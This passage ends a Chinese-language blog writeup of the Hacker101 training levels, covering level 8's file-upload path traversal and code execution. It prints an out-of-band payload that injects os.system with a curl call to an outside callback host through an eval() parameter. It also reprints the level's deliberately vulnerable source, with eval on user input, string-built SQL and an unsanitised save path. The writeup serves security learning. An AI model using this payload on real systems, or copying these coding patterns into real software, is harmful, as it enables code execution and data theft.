application/octet-stream</span><br><span class="line"></span><br><span class="line">read-handler.py</span><br><span class="line">-----------------------------2062164199649--</span><br></pre></td></tr></table></figure>
<p>修改 filename 为需要覆盖的文件，我们可以拿 level 5 中的目录遍历漏洞查看写入的内容。问题出现 doc.save(‘level8_sandbox/‘ + filename) ，filename 可以是包含 “.” 和 “/“ 的路径。</p>
<p><img src="./1522763213195.png" alt="1522763213195"></p>
<h3 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h3 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h3><p>漏洞在下载功能处，命令执行点 download = eval(download）。接收参数 download，但是没有输出，我们可以用服务器接收输出。</p>
<p>即外带式命令执行漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-b.hacker101.com&#x2F;level8&#x2F;view&#x2F;13151?download&#x3D;__import__(&#39;os&#39;).system(&#39;curl http:&#x2F;&#x2F;83i93o.ceye.io?from-hacker101&#39;)</span><br></pre></td></tr></table></figure>
<p>查看 http 请求，发现请求过来了，命令执行成功了。</p>
<p><img src="./1523069644629.png" alt="1523069644629"></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> handler <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level8/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>():</span></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(docs=db.query(<span class="string">&#x27;SELECT id, name, mimetype FROM documents WHERE sessid=%s&#x27;</span>, handler.sessid()))</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_index</span>(<span class="params">name, doc</span>):</span></span><br><span class="line">truefn, mime = doc.filename, doc.mimetype</span><br><span class="line"></span><br><span class="line">truedoc.save(<span class="string">&#x27;level8_sandbox/&#x27;</span> + fn)</span><br><span class="line"></span><br><span class="line">truedb.query(<span class="string">&quot;INSERT INTO documents (name, filename, mimetype, sessid) VALUES (&#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;)&quot;</span> % (name, fn, mime, handler.sessid()))</span><br><span class="line"></span><br><span class="line">trueredirect(get_index)</span><br><span class="line"></span><br><span class="line">inlinable = <span class="string">&#x27;image/jpeg image/png text/plain&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_view</span>(<span class="params"><span class="built_in">id</span>, download=<span class="string">&#x27;None&#x27;</span></span>):</span></span><br><span class="line">truedownload = <span class="built_in">eval</span>(download)</span><br><span class="line">true</span><br><span class="line">true(filename, mimetype), = db.query(<span class="string">&#x27;SELECT filename, mimetype FROM documents WHERE sessid=%s AND id=%s&#x27;</span>, handler.sessid(), <span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">true<span class="keyword">if</span> download == <span class="literal">None</span> <span class="keyword">and</span> mimetype <span class="keyword">not</span> <span class="keyword">in</span> inlinable:</span><br><span class="line">truetruedownload = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">true<span class="keyword">if</span> download:</span><br><span class="line">truetruehandler.header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment; filename=&#x27;</span> + filename)</span><br><span class="line"></span><br><span class="line">truehandler.header(<span class="string">&#x27;Content-Type&#x27;</span>, mimetype)</span><br><span class="line"></span><br><span class="line">true<span class="keyword">return</span> file(<span class="string">&#x27;level8_sandbox/&#x27;</span> + filename, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> db.hastable(<span class="string">&#x27;documents&#x27;</span>):</span><br><span class="line">truedb.maketable(<span class="string">&#x27;documents&#x27;</span>, </span><br><span class="line">truetruename=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruefilename=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruemimetype=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruesessid=<span class="string">&#x27;CHAR(16)&#x27;</span></span><br><span class="line">true)</span><br></pre></td></tr></table></figure>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sessions"><span class="toc-number">1.</span> <span class="toc-text">sessions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-number">2.</span> <span class="toc-text">Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coursework"><span class="toc-number">3.</span> <span class="toc-text">Coursework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-0"><span class="toc-number">4.</span> <span class="toc-text">level 0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">前端源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">4.2.</span> <span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">4.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">5.</span> <span class="toc-text">level 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">5.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-with-csrf-token"><span class="toc-number">5.2.</span> <span class="toc-text">CSRF with csrf token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forced-Browsing"><span class="toc-number">5.3.</span> <span class="toc-text">Forced Browsing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">6.</span> <span class="toc-text">level 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">6.1.</span> <span class="toc-text">Stored XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-XSS"><span class="toc-number">6.2.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unrelated-Bonus"><span class="toc-number">6.3.</span> <span class="toc-text">Unrelated Bonus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">7.</span> <span class="toc-text">level 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Improper-Authorization"><span class="toc-number">7.1.</span> <span class="toc-text">Improper Authorization</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-number">7.1.1.</span> <span class="toc-text">技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Various-XSS"><span class="toc-number">7.2.</span> <span class="toc-text">Various XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unrelated-Bonuses"><span class="toc-number">7.3.</span> <span class="toc-text">Unrelated Bonuses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">8.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-1"><span class="toc-number">8.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-1"><span class="toc-number">8.2.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unchecked-Redirects"><span class="toc-number">8.3.</span> <span class="toc-text">Unchecked Redirects</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Systemic-Information-Disclosures"><span class="toc-number">8.4.</span> <span class="toc-text">Systemic Information Disclosures</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Improper-Identity-Handling"><span class="toc-number">8.5.</span> <span class="toc-text">Improper Identity Handling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">9.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Directory-Traversal"><span class="toc-number">9.1.</span> <span class="toc-text">Directory Traversal</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.1.</span> <span class="toc-text">读取文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-XSS-1"><span class="toc-number">9.2.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">9.3.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">9.4.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">10.</span> <span class="toc-text">level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflected-Stored-XSS"><span class="toc-number">10.1.</span> <span class="toc-text">Reflected&#x2F;Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected-XSS-2"><span class="toc-number">10.1.1.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored-XSS-1"><span class="toc-number">10.1.2.</span> <span class="toc-text">Stored XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">10.2.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-2"><span class="toc-number">10.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">10.4.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">11.</span> <span class="toc-text">level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-1"><span class="toc-number">11.1.</span> <span class="toc-text">SQL Injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">12.</span> <span class="toc-text">level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-2"><span class="toc-number">12.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Directory-Traversal-1"><span class="toc-number">12.2.</span> <span class="toc-text">Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-2"><span class="toc-number">12.3.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Execution"><span class="toc-number">12.4.</span> <span class="toc-text">Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">12.5.</span> <span class="toc-text">源码</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2018/04/14/Hacker101-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&text=Hacker 101 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&is_video=false&description=Hacker 101 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hacker 101 Writeup&body=Check out this article: http://delikey.github.io/2018/04/14/Hacker101-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&title=Hacker 101 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2018/04/14/Hacker101-writeup/&name=Hacker 101 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 Delikely
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({{ JSON.stringify(config) }});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="{{ src }}">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'G-KX5LMFBRGG', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


